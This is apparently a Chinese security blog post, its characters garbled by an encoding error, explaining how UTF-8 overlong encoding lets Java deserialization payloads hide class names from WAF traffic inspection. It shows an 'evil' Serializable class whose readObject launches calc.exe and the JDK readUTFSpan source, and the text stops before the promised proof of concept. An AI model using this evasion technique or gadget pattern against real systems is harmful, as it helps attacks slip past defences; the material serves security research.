    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="0x01-å‰è¨€">0x01 å‰è¨€<a hidden class="anchor" aria-hidden="true" href="#0x01-å‰è¨€">#</a></h2>
<p><a href="https://t.zsxq.com/17LkqCzk8">Javaååºåˆ—åŒ–ä¸­åº”ç”¨</a> @1ue</p>
<p><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">UTF-8 Overlong EncodingåŸç†</a> @pç‰›</p>
<blockquote>
<p>æ‹œè¯»ä¸Šé¢ä¸¤ç¯‡æ–‡ç« åï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè·Ÿç€1ueå¸ˆå‚…çš„æ–‡ç« å†åˆ†æäº†ä¸‹ï¼Œè¿™é‡Œ<code>UTF-8 Overlong Encoding</code>åœ¨javaä¸­è§£å†³äº†æµé‡çš„ç›‘æµ‹çš„ç»•è¿‡ï¼Œè®©<code>æ˜æ–‡ç±»å</code>åœ¨æµé‡ä¸Šä¸å†æ˜¯asciiä¸­çš„å­—ç¬¦ï¼Œä½†æ˜¯ååºåˆ—åŒ–åˆèƒ½è§£ææˆæ­£å¸¸æ•°æ®ï¼Œç»•è¿‡wafæ‹¦æˆªï¼Œä½†æ˜¯åˆ†æå®Œå‘ç°åŠ å¯†å¯¹åº”çš„å€¼æ˜¯å›ºå®šçš„ï¼Œä¸è¿‡å¯ä»¥2ï¼Œ3byte<code>äº¤å‰æ··æ´—</code>ã€‚</p>
</blockquote>
<p>ä¸‹æ–‡å¯¹utf-8åœ¨ååºåˆ—åŒ–ä¸­çš„åŸç†è¿›è¡Œäº†è§£æï¼Œç„¶åæ„é€ pocå¹¶æ”¹è¿›pocï¼Œå®ç°<code>å…¨å­—æ®µåŠ å¯†</code></p>
<h2 id="0x02-utf-8-overlong-encodingåŸç†">0x02 UTF-8 Overlong EncodingåŸç†<a hidden class="anchor" aria-hidden="true" href="#0x02-utf-8-overlong-encodingåŸç†">#</a></h2>
<p>è¿™é‡Œå¤§æ¦‚è§£é‡Šä¸‹åŸç†ï¼Œå…·ä½“ä¹Ÿå¯ä»¥çœ‹pç‰›æ–‡ç« </p>
<h3 id="utf-8ç¼–ç ">utf-8ç¼–ç <a hidden class="anchor" aria-hidden="true" href="#utf-8ç¼–ç ">#</a></h3>
<p>å‚è€ƒè¿™ä¸ªè¡¨æ ¼ï¼Œç”¨äºå°†unicodeç è½¬æ¢æˆUTF-8ç¼–ç ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">First code point</th>
<th style="text-align:center">Last code point</th>
<th style="text-align:center">Byte 1</th>
<th style="text-align:center">Byte 2</th>
<th style="text-align:center">Byte 3</th>
<th style="text-align:center">Byte 4</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">U+0000</td>
<td style="text-align:center">U+007F</td>
<td style="text-align:center">0xxxxxxx</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">U+0080</td>
<td style="text-align:center">U+07FF</td>
<td style="text-align:center">110xxxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">U+0800</td>
<td style="text-align:center">U+FFFF</td>
<td style="text-align:center">1110xxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">U+10000</td>
<td style="text-align:center">U+10FFFF</td>
<td style="text-align:center">11110xxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center">10xxxxxx</td>
<td style="text-align:center">10xxxxxx</td>
</tr>
</tbody>
</table>
<p>åŠå½“<code>å­—ç¬¦uincodeç¼–ç </code>è¶…è¿‡<code>U+007F</code>æ—¶ï¼Œ<code>UTF-8</code>ä¼šç”¨<code>å¤šä¸ªByte</code>æ¥ä»£è¡¨è¿™ä¸ªå­—ç¬¦(U+0080-U+07FFè¿™ä¸ªèŒƒå›´å°±<code>2ä¸ªByte</code>ï¼Œå…¶ä»–èŒƒå›´è§ä¸Šè¡¨)</p>
<blockquote>
<p>è¿™ç§æ–¹å¼çœ‹ä¼¼ä¹Ÿæ²¡æ¯›ç—…ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŠŠæœ¬èº«æ˜¯<code>1Byteå­—ç¬¦</code>ï¼ŒæŒ‰ç…§<code>2Byteçš„æ ¼å¼</code>ï¼ˆä¸Šå›¾ï¼‰æ„é€ ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢</p>
</blockquote>
<p>Pç‰›ç”¨ç‚¹å·<code>.</code>ä¸¾äº†ä¸ªä¾‹å­ï¼Œå…¶unicodeç¼–ç å’Œasciiç¼–ç ä¸€è‡´ï¼Œå‡ä¸º<code>0x2E</code>ã€‚æŒ‰ç…§ä¸Šè¡¨ï¼Œå®ƒåªèƒ½è¢«ç¼–ç æˆå•å­—èŠ‚çš„UTF-8å­—ç¬¦ï¼Œä½†æˆ‘æŒ‰ç…§ä¸‹é¢çš„æ–¹æ³•è¿›è¡Œè½¬æ¢ï¼š</p>
<ul>
<li><code>0x2E</code>çš„äºŒè¿›åˆ¶æ˜¯<code>10 1110</code>ï¼Œæˆ‘ç»™å…¶å‰é¢è¡¥5ä¸ª0ï¼Œå˜æˆ<code>00000101110</code></li>
<li>å°†å…¶åˆ†æˆ5ä½ã€6ä½ä¸¤ç»„ï¼š<code>00000</code>ï¼Œ<code>101110</code></li>
<li>åˆ†åˆ«ç»™è¿™ä¸¤ç»„å¢åŠ å‰ç¼€<code>110</code>ï¼Œ<code>10</code>ï¼Œç»“æœæ˜¯<code>11000000</code>ï¼Œ<code>10101110</code>ï¼Œå¯¹åº”çš„æ˜¯<code>\xC0\xAE</code></li>
</ul>
<p><strong><code>0xC0AE</code>å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„UTF-8å­—ç¬¦ï¼Œä½†æˆ‘ä»¬ç¡®å®æ˜¯æŒ‰ç…§UTF-8ç¼–ç æ–¹å¼å°†å…¶è½¬æ¢å‡ºæ¥çš„</strong>ï¼Œè¿™å°±æ˜¯UTF-8è®¾è®¡ä¸­çš„ä¸€ä¸ªç¼ºé™·ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜åœ¨pythonä¸­å·²ç»ä¿®å¤è¿‡äº†ï¼Œä½†æ˜¯javaä»»ç„¶å­˜åœ¨ï¼ˆæˆ‘è§‰å¾—javaå¯ä»¥utf-8è½¬åŒ–åå†è¿›è¡Œä¸€æ¬¡èŒƒå›´åˆ¤æ–­ï¼Œ1byteæ˜¯å°äº127çš„ï¼‰</p>
<p>é‚£æˆ‘ä»¬è¿›å…¥æ­£é¢˜ï¼Œçœ‹çœ‹<code>UTF-8 Overlong Encoding</code>åœ¨javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨ï¼Œååºåˆ—åŒ–å­˜åœ¨è¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºååºåˆ—åŒ–å’Œååºåˆ—åŒ–å°†å­—ç¬¦è½¬æ¢çš„æ–¹å¼æ­£æ˜¯ä¸Šé¢utf-8åˆ°uincodeè¿™ç§æ¨¡å¼è¿›è¡Œè½¬æ¢çš„ã€‚</p>
<h2 id="0x03-readobject-utf-8">0x03 readObject UTF-8<a hidden class="anchor" aria-hidden="true" href="#0x03-readobject-utf-8">#</a></h2>
<p>è¿™é‡Œå¯ä»¥è·Ÿç€1ueå¸ˆå‚…æ–‡ç« çœ‹</p>
<p>demoæ–¹ä¾¿è°ƒè¯•</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">UTF8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">evil</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å¼€å§‹debugï¼Œè§‚æµ‹<code>readObject</code>æ˜¯ä½•æ—¶æ‹¿å–<code>className</code>çš„</p>
<p>è¿™é‡Œ1ueå¸ˆå‚…ç»™å‡ºäº†è°ƒç”¨é“¾</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ObjectStreamClass#readNonProxy(ObjectInputStream in)
</span></span><span class="line"><span class="cl">	ObjectInputStream#readUTF()
</span></span><span class="line"><span class="cl">		BlockDataInputStream#readUTF()
</span></span><span class="line"><span class="cl">			ObjectInputStream#readUTFBody(long utflen)
</span></span><span class="line"><span class="cl">				ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)
</span></span></code></pre></div><p>å…³é”®ç‚¹å°±åœ¨<code>readUTFSpan()</code>ï¼Œååºåˆ—åŒ–evilç±»ï¼Œæ‰“ä¸ªæ–­ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹è¿™ä¸ªå‡½æ•°å¹²äº†å•¥</p>
<blockquote>
<p><code>utflen</code>æ˜¯è·å–çš„<code>ç±»åçš„é•¿åº¦</code>ï¼Œç„¶åwhileæ‰§è¡Œ<code>stop-pos(ä¸€èˆ¬å°±æ˜¯utflen)</code>æ¬¡ï¼Œæ¥è§£æç±»åçš„æ¯ä¸ªå­—ç¬¦å­˜å‚¨åˆ°<code>cbuf</code>ï¼Œæœ€åå†æ·»åŠ åˆ°<code>sbuf</code>ï¼Œé—®é¢˜å°±åœ¨è§£ææ¯ä¸ªå­—èŠ‚çš„æ—¶å€™</p>
<p>ä»æ³¨é‡Šèƒ½ä¸€çœ¼å‘ç°ï¼Œæ˜¯å­˜åœ¨UTF-8ç¼–ç è§„åˆ™çš„é—®é¢˜ï¼Œä¸‹æ–‡ç»“åˆå›¾ç‰‡åˆ†æé—®é¢˜</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">readUTFSpan</span><span class="p">(</span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">sbuf</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">cpos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pos</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">avail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">CHAR_BUF_SIZE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// stop short of last char unless all of utf bytes in buffer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">stop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">utflen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">avail</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">avail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">outOfBounds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">stop</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">b1</span><span class="p">,</span><span class="w"> </span><span class="n">b2</span><span class="p">,</span><span class="w"> </span><span class="n">b3</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">b1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xFF</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">b1</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">2</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">3</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">4</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">5</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">6</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">7</span><span class="p">:</span><span class="w">   </span><span class="c1">// 1 byte format: 0xxxxxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">b1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">12</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">13</span><span class="p">:</span><span class="w">  </span><span class="c1">// 2 byte format: 110xxxxx 10xxxxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">b2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="o">++]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xC0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0x80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(((</span><span class="n">b1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x1F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                           </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">case</span><span class="w"> </span><span class="n">14</span><span class="p">:</span><span class="w">  </span><span class="c1">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">b3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">b2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="o">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">pos</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xC0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0x80</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">b3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0xC0</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">0x80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">cbuf</span><span class="o">[</span><span class="n">cpos</span><span class="o">++]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="p">(((</span><span class="n">b1</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x0F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">12</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                           </span><span class="p">((</span><span class="n">b2</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">6</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                           </span><span class="p">((</span><span class="n">b3</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">0x3F</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">default</span><span class="p">:</span><span class="w">  </span><span class="c1">// 10xx xxxx, 1111 xxxx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ArrayIndexOutOfBoundsException</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">outOfBounds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">outOfBounds</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">utflen</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">             * Fix for 4450867: if a malformed utf char causes the
</span></span></span><span class="line"><span class="cl"><span class="cm">             * conversion loop to scan past the expected end of the utf
</span></span></span><span class="line"><span class="cl"><span class="cm">             * string, only consume the expected number of utf bytes.
</span></span></span><span class="line"><span class="cl"><span class="cm">             */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="n">utflen</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UTFDataFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sbuf</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">cbuf</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">cpos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><blockquote>
